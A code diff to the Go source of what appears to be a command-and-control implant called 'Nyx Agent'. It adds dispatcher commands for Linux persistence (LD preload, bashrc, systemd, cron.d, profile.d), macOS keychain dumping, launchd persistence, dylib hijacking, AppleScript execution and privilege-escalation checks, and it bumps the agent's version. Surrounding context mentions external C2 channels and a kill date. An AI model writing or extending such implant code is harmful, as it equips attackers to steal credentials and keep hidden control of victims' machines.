@@ -999,6 +999,164 @@ func dispatch(command string) (string, string) {
 		}
 		return out, "completed"
 
+	// ── Phase 9: Multi-platform Native ─────────────────────────────────────────
+
+	// Linux persistence
+	case "linux-privesc":
+		out, err := linuxPrivescCheck()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "linux-persist-ld":
+		if arg == "" {
+			return "usage: linux-persist-ld <so_path>", "failed"
+		}
+		out, err := linuxPersistLD(strings.TrimSpace(arg))
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "linux-persist-bashrc":
+		if arg == "" {
+			return "usage: linux-persist-bashrc <cmd>", "failed"
+		}
+		out, err := linuxPersistBashrc(arg)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "linux-persist-systemd":
+		// usage: linux-persist-systemd <name> <cmd>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: linux-persist-systemd <name> <cmd>", "failed"
+		}
+		out, err := linuxPersistSystemd(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "linux-persist-crond":
+		// usage: linux-persist-crond <name> <cron_expr> <cmd>
+		// cron_expr must be quoted or 5 space-separated fields + cmd: split on first word as name
+		p := strings.SplitN(arg, " ", 3)
+		if len(p) < 3 {
+			return "usage: linux-persist-crond <name> <cron_5fields> <cmd>", "failed"
+		}
+		// p[1] may be a single quoted cron expression — pass as-is
+		out, err := linuxPersistCronD(p[0], p[1], p[2])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "linux-persist-profiled":
+		// usage: linux-persist-profiled <name> <cmd>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: linux-persist-profiled <name> <cmd>", "failed"
+		}
+		out, err := linuxPersistProfileD(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "linux-persist-list":
+		out, err := linuxPersistList()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "linux-persist-remove":
+		// usage: linux-persist-remove <mech> <name>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: linux-persist-remove <ld|bashrc|systemd|crond|profiled> <name>", "failed"
+		}
+		out, err := linuxPersistRemove(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	// macOS native
+	case "darwin-keychain":
+		out, err := darwinKeychainDump()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "darwin-launchd":
+		// usage: darwin-launchd <name> <cmd>
+		p := strings.SplitN(arg, " ", 2)
+		if len(p) < 2 {
+			return "usage: darwin-launchd <name> <cmd>", "failed"
+		}
+		out, err := darwinLaunchdInstall(p[0], p[1])
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "darwin-launchd-remove":
+		if arg == "" {
+			return "usage: darwin-launchd-remove <name>", "failed"
+		}
+		out, err := darwinLaunchdRemove(strings.TrimSpace(arg))
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "darwin-dylib-hijack":
+		if arg == "" {
+			return "usage: darwin-dylib-hijack <app_path>", "failed"
+		}
+		out, err := darwinDylibHijack(strings.TrimSpace(arg))
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "darwin-enum-users":
+		out, err := darwinEnumUsers()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "darwin-osascript":
+		if arg == "" {
+			return "usage: darwin-osascript <applescript>", "failed"
+		}
+		out, err := darwinOsascript(arg)
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "darwin-privesc":
+		out, err := darwinPrivescCheck()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
+	case "darwin-sip":
+		out, err := darwinSIPStatus()
+		if err != nil {
+			return err.Error(), "failed"
+		}
+		return out, "completed"
+
 	// ── Phase 8: External C2 Channels ──────────────────────────────────────────
 
 	case "extc2-github":
@@ -1207,7 +1365,7 @@ func removePersistence() string {
 }
 
 func main() {
-	fmt.Println("[*] Nyx Agent v1.3.0 starting...")
+	fmt.Println("[*] Nyx Agent v1.4.0 starting...")
 
 	// Kill date check
 	checkKillDate()
